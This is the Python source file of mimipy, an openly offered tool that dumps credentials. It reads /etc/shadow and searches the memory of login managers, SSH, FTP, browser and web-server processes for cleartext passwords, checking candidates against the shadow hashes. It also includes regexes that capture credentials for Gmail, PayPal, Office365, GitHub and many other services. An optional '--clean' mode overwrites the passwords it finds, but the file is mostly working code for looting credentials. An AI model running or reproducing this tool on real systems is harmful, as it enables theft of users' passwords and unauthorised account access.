#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# mimipy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms


"""
    Author: Nicolas VERDIER (contact@n1nj4.eu)
    Original idea from @huntergregal (https://github.com/huntergregal/mimipenguin)
    This is a port in python of @huntergregal's bash script mimipenguin.sh with some improvments :
        - possibility to clean passwords found from memory
        - possibility to search for any trace of your password in all your processes
        - possibility to scan a process by pid
        - add some additional processes to scan like lightDM
    You can find the bleeding edge version of mimipy here : https://github.com/n1nj4sec/mimipy

"""
import sys, os
import urllib2
import re
import argparse
import logging
import time
import random
import traceback
import base64
if sys.platform!="win32":
    import crypt

class VersionError(Exception):
    pass

try:
    from memorpy import *
    try:
        from memorpy.version import version as memorpy_version
    except:
        memorpy_version=(0,0)
    if memorpy_version < (1,6):
        logging.warning("memorpy version is too old, please update !")
        raise VersionError("memorpy version is too old, please update !")
        
except ImportError as e:
    logging.warning("%s\ninstall with: \"pip install https://github.com/n1nj4sec/memorpy/archive/master.zip\""%e)
    raise e

LOOK_AFTER_SIZE=2*10**6
LOOK_BEFORE_SIZE=2*10**6




def colorize(s, color="grey"):
    if s is None:
        return ""
    s=str(s)
    res=s
    COLOR_STOP="\033[0m"
    if color.lower()=="random":
        color=random.choice(["blue","red","green","yellow"])
    if color.lower()=="blue":
        res="\033[34m"+s+COLOR_STOP
    if color.lower()=="red":
        res="\033[31m"+s+COLOR_STOP
    if color.lower()=="green":
        res="\033[32m"+s+COLOR_STOP
    if color.lower()=="yellow":
        res="\033[33m"+s+COLOR_STOP
    if color.lower()=="grey":
        res="\033[37m"+s+COLOR_STOP
    if color.lower()=="darkgrey":
        res="\033[1;30m"+s+COLOR_STOP
    return res


def get_shadow_hashes():

    if sys.platform=="win32" or sys.platform=="darwin":
        return []

    hashes=[]
    try:
        with open('/etc/shadow', 'rb') as f:
            for line in f:
                tab=line.split(":")
                if len(tab[1])>10:
                    hashes.append((tab[0],tab[1]))
    except Exception as e:
        logging.warning("Error retrieving shadow hashes: %s"%e)

    return hashes


def memstrings(mw, start_offset=None, end_offset=None, optimizations=''):
    for _,x in mw.mem_search(r"([\x20-\x7e]{6,50})[^\x20-\x7e]", ftype='re', start_offset=start_offset, end_offset=end_offset, optimizations=optimizations):
        yield x



passwords_found=set()
def password_found(desc, process, user, password):
    global passwords_found
    if (process, user, password) not in passwords_found:
        passwords_found.add((process, user, password))
        print colorize("%s : "%desc, color="green")
        print colorize("\t- Process\t: %s"%process, color="grey")
        print colorize("\t- Username\t: %s"%user, color="grey")
        print colorize("\t- Password\t: %s"%password, color="grey")


def password_list_match(password_list, near):
    for passwd in password_list:
        if near.search(passwd):
            return True
    return False

def cleanup_string(s):
    ns=""
    for c in s:
        if ord(c)<0x20 or ord(c)>0x7e:
            break
        ns+=c
    return ns

def get_strings_around(mw, addr, string_at_addr, max_strings=30):
    strings_list=[]
    logging.debug("looking for strings around %s from %s to %s"%(hex(addr), int(addr-LOOK_BEFORE_SIZE), int(addr-LOOK_AFTER_SIZE)))
    for o in memstrings(mw, start_offset=int(addr-LOOK_BEFORE_SIZE), end_offset=int(addr+LOOK_AFTER_SIZE)):
        s=cleanup_string(o.read(type='string', maxlen=51, errors='ignore'))
        strings_list.append(s)
        if len(strings_list)>=30 and string_at_addr in strings_list[max_strings/2]:
            break
        elif len(strings_list)>30:
            strings_list=strings_list[1:]
    return strings_list

def search_password(optimizations='nsrx', pid=None, mode="cleartext", ignore=[]):
    import getpass
    mypasswd=getpass.getpass("search your password: ")
    if mode!="no-cleartext":
        if mode=="cleartext" or mode=="all":
            print ("Searching for cleartext ...")
            search_string(mypasswd, optimizations=optimizations, pid=pid, ignore=ignore)
    else:
        mode="all"
    if mode=="xor" or mode=="all":
        for i in range(1,255):
            newpasswd=''.join([chr(ord(x)^i) for x in mypasswd])
            print ("Searching for password xored with %s : %s ..."%(hex(i), repr(newpasswd)))
            search_string(newpasswd, optimizations=optimizations, pid=pid, ignore=ignore)
    if mode=="b64" or mode=="all":
        newpasswd=base64.b64encode(mypasswd)
        print ("Searching for password encoded with base64 : %s ..."%(newpasswd))
        search_string(newpasswd, optimizations=optimizations, pid=pid, ignore=ignore)

def search_string(mypasswd, optimizations='nsrx', pid=None, ignore=[]):
    for procdic in Process.list():
        name=procdic.get("name","")
        cpid=int(procdic["pid"])
        if sys.platform=="win32":
            if pid==0 or pid==4:
                continue
        if pid is not None:
            if pid!=cpid:
                continue
        elif cpid==os.getpid():
            continue
        if ignore:
            ignore_proc=False
            for i in ignore:
                if i in name:
                    ignore_proc=True
                    break
            if ignore_proc:
                logging.info("process %s ignored"%name)
                continue
        logging.info("Searching pass in %s (%s)"%(name, cpid))
        try:
            with MemWorker(pid=cpid) as mw:
                #for _,x in mw.mem_search(r"\$[0-9][a-z]?\$(?:[a-zA-Z0-9\./\-\+]{4,}\$)?[a-zA-Z0-9\./\-\+]{20,}", ftype='re'):
                #    h=x.read(type='string', maxlen=300)
                #    print "hash found in %s (%s) : %s"%(name, pid, h)
                #    strings_list=get_strings_around(mw, x, h)
                #    print "strings found around : %s"%strings_list
                #    if not strings_list:
                #        x.dump(before=200, size=400)
                for x in mw.mem_search(mypasswd, optimizations=optimizations):
                    print colorize("[+] password found in process %s (%s) : %s !"%(name, cpid, x), color="green")
                    x.dump(before=500, size=1000)
                    print "strings found around : "
                    strings_list=get_strings_around(mw, x, mypasswd)
                    print "strings found around : %s"%strings_list
                    #print "strings where the password's address is referenced :"
                    #for _,o in mw.search_address(x):
                    #    o.dump(before=200, size=400)
                    #print "done"

        except Exception as e:
            logging.error("Error scanning process %s (%s): %s"%(name, cpid, e))
            logging.debug(traceback.format_exc())

#from https://github.com/putterpanda/mimikittenz
mimikittenz_regex=[
    ("Gmail","&Email=(?P<Login>.{1,99})?&Passwd=(?P<Password>.{1,99})?&PersistentCookie="),
    ("Dropbox","login_email=(?P<Login>.{1,99})&login_password=(?P<Password>.{1,99})&"),
    ("SalesForce","&display=page&username=(?P<Login>.{1,32})&pw=(?P<Password>.{1,16})&Login="),
    ("Office365","login=(?P<Login>.{1,32})&passwd=(?P<Password>.{1,22})&PPSX="),
    ("MicrosoftOneDrive","login=(?P<Login>.{1,42})&passwd=(?P<Password>.{1,22})&type=.{1,2}&PPFT="),
    ("PayPal","login_email=(?P<Login>.{1,48})&login_password=(?P<Password>.{1,16})&submit=Log\+In&browser_name"),
    ("awsWebServices","&email=(?P<Login>.{1,48})&create=.{1,2}&password=(?P<Password>.{1,22})&metadata1="),
    ("OutlookWeb","&username=(?P<Login>.{1,48})&password=(?P<Password>.{1,48})&passwordText"),
    ("Slack","&crumb=.{1,70}&email=(?P<Login>.{1,50})&password=(?P<Password>.{1,48})"),
    ("CitrixOnline","emailAddress=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&submit"),
    ("Xero ","fragment=&userName=(?P<Login>.{1,32})&password=(?P<Password>.{1,22})&__RequestVerificationToken="),
    ("MYOB","UserName=(?P<Login>.{1,50})&Password=(?P<Password>.{1,50})&RememberMe="),
    ("JuniperSSLVPN","tz_offset=-.{1,6}&username=(?P<Login>.{1,22})&password=(?P<Password>.{1,22})&realm=.{1,22}&btnSubmit="),
    ("Twitter","username_or_email%5D=(?P<Login>.{1,42})&session%5Bpassword%5D=(?P<Password>.{1,22})&remember_me="),
    ("Facebook","lsd=.{1,10}&email=(?P<Login>.{1,42})&pass=(?P<Password>.{1,22})&(?:default_)?persistent="),
    ("LinkedIN","session_key=(?P<Login>.{1,50})&session_password=(?P<Password>.{1,50})&isJsEnabled"),
    ("Malwr","&username=(?P<Login>.{1,32})&password=(?P<Password>.{1,22})&next="),
    ("VirusTotal","password=(?P<Password>.{1,22})&username=(?P<Login>.{1,42})&next=%2Fen%2F&response_format=json"),
    ("AnubisLabs","username=(?P<Login>.{1,42})&password=(?P<Password>.{1,22})&login=login"),
    ("CitrixNetScaler","login=(?P<Login>.{1,22})&passwd=(?P<Password>.{1,42})"),
    ("RDPWeb","DomainUserName=(?P<Login>.{1,52})&UserPass=(?P<Password>.{1,42})&MachineType"),
    ("JIRA","username=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&rememberMe"),
    ("Redmine","username=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&login=Login"),
    ("Github","%3D%3D&login=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})"),
    ("BugZilla","Bugzilla_login=(?P<Login>.{1,50})&Bugzilla_password=(?P<Password>.{1,50})"),
    ("Zendesk","user%5Bemail%5D=(?P<Login>.{1,50})&user%5Bpassword%5D=(?P<Password>.{1,50})"),
    ("Cpanel","user=(?P<Login>.{1,50})&pass=(?P<Password>.{1,50})"),
]

def search_http_creds(data, offset):
    #those basic string search pre-checks speed up a lot analysis
    if "Basic " in data:
        for res in GLOBAL_REGEX['Basic'].finditer(data):
            b64=res.groups()[0]
            try:
                user, password=base64.b64decode(b64).split(":",1)
            except: #if we can't decode it's a false positive
                pass
            else:
                yield "Basic", user, password, "unknown"

    for word in ["passw","Passw","PASSW"]:
        if word in data:
            index=0
            while True:
                if index > len(data):
                    break
                ni=data.find(word, index)
                if ni==-1:
                    break
                si=ni-100
                if si<0:
                    si=0
                #print "GET/POST in data %s"%offset
                for res in GLOBAL_REGEX['GET/POST'].finditer(data, si, ni+100):
                    dic=res.groupdict()
                    login=dic["Login"]
                    passwd=dic["Password"]
                    domain="unknown"
                    #now we found a password, let's check if it's a known website
                    for d, regex in mimikittenz_regex:
                        if re.search(regex, data[si:ni+100]):
                            domain=d
                            break
                    yield "GET/POST", dic["Login"], dic["Password"], domain
                index=ni+100

def loot_http_passwords(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
    logging.info("Analysing process %s (%s) for HTTP passwords ..."%(name, pid))
    with MemWorker(name=name, pid=pid) as mw:
        for cred_type, login, password, domain in mw.mem_search(search_http_creds, ftype='lambda', optimizations=optimizations):
            desc=rule["desc"]+" "+cred_type+":<%s>"%domain
            yield (desc, login, password)

def loot_mysql_passwords(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
    logging.info("Analysing process %s (%s) for MySQL passwords ..."%(name, pid))
    with MemWorker(name=name, pid=pid) as mw:
        for cred_type, login, password in mw.mem_search(search_mysql_creds, ftype='lambda', optimizations=optimizations):
            yield (rule["desc"]+" "+cred_type, login, password)

def test_shadow(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
    logging.info("Analysing process %s (%s) for shadow passwords ..."%(name, pid))
    password_tested=set() #to avoid hashing the same string multiple times
    with MemWorker(name=name, pid=pid) as mw:
        scanned_segments=[]
        for _,match_addr in mw.mem_search(rule["near"], ftype='re', optimizations=optimizations):
            password_list=[]
            total=0
            start=int(match_addr-LOOK_AFTER_SIZE)
            end=int(match_addr+LOOK_AFTER_SIZE)
            for s,e in scanned_segments:
                if end < s or start > e:
                    continue #no collision
                elif start >=s and e >= start and end >= e:
                    logging.debug("%s-%s reduced to %s-%s"%(hex(start), hex(end), hex(e), hex(end)))
                    start=e-200 #we only scan a smaller region because some of it has already been scanned
            logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
            scanned_segments.append((start, end))
            for x in memstrings(mw, start_offset=start, end_offset=end, optimizations=optimizations):
                passwd=cleanup_string(x.read(type='string', maxlen=51, errors='ignore'))
                total+=1
                password_list.append(passwd)
                if len(password_list)>40:
                    password_list=password_list[1:]
                if password_list_match(password_list, rule["near"]):
                    for p in password_list:
                        if p not in password_tested:
                            password_tested.add(p)
                            for user, h in shadow_hashes:
                                if crypt.crypt(p, h) == h:
                                    yield (rule["desc"], user, p)
                                    if clean:
                                        logging.info("cleaning password from memory in proc %s at offset: %s ..."%(name, hex(x)))
                                        x.write("x"*len(p))
shadow_hashes=[]
def mimipy_loot_passwords(clean=False, optimizations='nsrx', ignore=None):
    global shadow_hashes
    shadow_hashes=get_shadow_hashes()
    for procdic in Process.list():
        name=procdic.get("name", "")
        pid=int(procdic["pid"])
        if sys.platform=="win32":
            if pid==0 or pid==4:
                continue
        if ignore:
            ignore_proc=False
            for i in ignore:
                if i in name:
                    ignore_proc=True
                    break
            if ignore_proc:
                logging.info("process %s ignored"%name)
                continue
        for rule in rules:
            if re.search(rule["process"], name):
                start_time=time.time()
                try:
                    for t, u, p in rule["func"](name, pid, rule, clean=clean, optimizations=optimizations):
                        yield (t, name, u, p)
                except Exception as e:
                    logging.warning("[-] %s"%e)
                    logging.debug(traceback.format_exc())
                finally:
                    logging.info("Process %s analysed in %s seconds"%(name, time.time()-start_time))

GLOBAL_REGEX = {
    #\x00Basic b64\x00 often found in firefox
    "Basic" : re.compile(r"(?:WWW-|Proxy-)?(?:(?:Authorization(?:\x00|:)\s*)|\x00)Basic\s+(?P<basic>[a-zA-Z0-9/\+]+={0,3})", re.IGNORECASE), #TODO: digest, ntlm, ... hashes are still nice

    "GET/POST" : re.compile(r"(:?e?mail(?:_?adress)?|log(?:in)?|user(?:name)?|session_key|user%5Bemail%5D)=(?P<Login>[a-zA-Z0-9%_+*.:-]{0,25})&.{0,10}?(?:[a-z]{1,10}_|user)?(?:pa?s?s?w?o?r?d?|mdp|%5Bpassword%5D)=(?P<Password>[a-zA-Z0-9%_+*.:-]{0,25})", re.IGNORECASE),
    "MySQL-Client-1" : re.compile(r"passwd\x00\x00!(?:\x00){2,}(?P<Login>[^\x00]+).*?shadow\x00\x00*!(?:\x00){2,}(?P<Password>[^\x00]+)"),
    "MySQL-Client-2" : re.compile(r"/var/run/mysqld/mysqld.sock(?:\x00)+[0-9\.-]+(?:\x00)+!(?:\x00)+(?P<Login>[^\x00]+)(?:\x00)+!(?:\x00)+(?P<Password>[^\x00]+)"),
    "MySQL-Client-3" : re.compile(r"\x00!(?:\x00)+(?P<Login>[^\x00]+)(?:\x00)+!(?:\x00)+(?P<Password>[^\x00]+)(?:\x00)+mysql> elp;"),
}

rules = [
    {
        "desc" : "[SYSTEM - GNOME]",
        "process" : r"gnome-keyring-daemon|gdm-password|gdm-session-worker",
        "near" : r"libgcrypt\.so\..+|libgck\-1\.so\.0|_pammodutil_getpwnam_|gkr_system_authtok",
        "func" : test_shadow,
    },
    {
        "desc" : "[SYSTEM - LightDM]", # Ubuntu/xubuntu login screen :) https://doc.ubuntu-fr.org/lightdm
        "process" : r"lightdm",
        "near" : r"_pammodutil_getpwnam_|gkr_system_authtok",
        "func" : test_shadow,
    },
    {
        "desc" : "[SYSTEM - SSH Server - sudo]",
        "process" : r"/sshd$",
        "near" : r"sudo.+|_pammodutil_getpwnam_",
        "func" : test_shadow,
    },
    {
        "desc" : "[SSH Client - sudo]",
        "process" : r"/ssh$",
        "near" : r"sudo.+|/tmp/ICE-unix/[0-9]+",
        "func" : test_shadow,
    },
    {
        "desc" : "[SYSTEM - VSFTPD]",
        "process" : r"vsftpd",
        "near" : r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",
        "func" : test_shadow,
    },
    #{
    #    "desc" : "[MySQL Client]",
    #    "process" : r"/mysql$",
    #    "func" : loot_mysql_passwords,
    #},
    {
        "desc" : "[HTTP]",
        "process" : r"firefox|iceweasel|chromium|chrome|/apache2|squid",
        "func" : loot_http_passwords,
    },
]

REGEX_TYPE=type(re.compile("^plop$"))
#precompile regexes to optimize speed
for x in rules:
    if "near" in x:
        if type(x["near"])!=REGEX_TYPE:
            x["near"]=re.compile(x["near"])
    if "process" in x:
        if type(x["process"])!=REGEX_TYPE:
            x["process"]=re.compile(x["process"])

if __name__=="__main__":
    parser = argparse.ArgumentParser(description="""
    mimipy can loot passwords from memory or overwrite them to mitigate mimipenguin\'s dumps !

    Author: Nicolas VERDIER (contact@n1nj4.eu)
    orginal mimipenguin.sh script and idea from @huntergregal
    Bleeding Edge version: https://github.com/n1nj4sec/mimipy
    
    """, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--clean', action='store_true', help='@blueteams protect yourself and clean found passwords from memory ! You might want to regularly run this on your workstation/servers')
    parser.add_argument('-v', '--verbose', action='store_true', help='be more verbose !')
    parser.add_argument('-n', '--no-optimize', action='store_true', help='disable optimisations (search the whole memory whatever region perms are) (slower)')
    parser.add_argument('-p', '--pid', type=int, help='choose the process\'s pid to scan instead of automatic selection')
    parser.add_argument('-i', '--ignore', action='append', help='ignore a process. This option can be used multiple times. ex: -i apache2 -i firefox')
    parser.add_argument('--search-password', action='store_true', help='prompt for your password and search it in all your processes !.')
    parser.add_argument('-m', '--search-mode', choices=["cleartext", "xor", "b64", "all", "no-cleartext"], default='cleartext', help='search for different obfuscations methods')
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(stream=sys.stderr, level=logging.INFO)
    else:
        logging.basicConfig(stream=sys.stderr, level=logging.WARNING)
    logging.basicConfig(filename='example.log', level=logging.DEBUG)

    total_time=time.time()

    if sys.platform!='win32':
        if os.geteuid()!=0:
            if sys.platform=="darwin":
                logging.error("needs root to run mimipy on macOS")
                exit(1)
            else:
                logging.warning("Some of mimipy's functions are only available when running as root")

    opt="nsrx"
    if args.no_optimize:
        logging.info("Optimizations disabled")
        opt=''

    if args.search_password:
        search_password(optimizations=opt, pid=args.pid, mode=args.search_mode, ignore=args.ignore)
        exit(0)

    if args.pid:
        pid_found=False
        for procdic in Process.list():
            name=procdic.get("name","")
            pid=int(procdic["pid"])
            if sys.platform=="win32":
                if pid==0 or pid==4:
                    continue
            if pid==args.pid:
                pid_found=True
                try:
                    start_time=time.time()
                    for rule in rules:
                        for t,u,p in rule["func"](name, pid, rule, clean=args.clean, optimizations=opt):
                            password_found(t, name, u, p)
                except Exception as e:
                    logging.warning("[-] %s"%e)
                finally:
                    logging.info("Process %s analysed in %s seconds"%(name, time.time()-start_time))
        if not pid_found:
            logging.info("pid %s not found !"%args.pid)
    else:
        for t, process, u, passwd in mimipy_loot_passwords(optimizations=opt, clean=args.clean, ignore=args.ignore):
            password_found(t, process, u, passwd)
    logging.info("Script executed in %s seconds"%(time.time()-total_time))



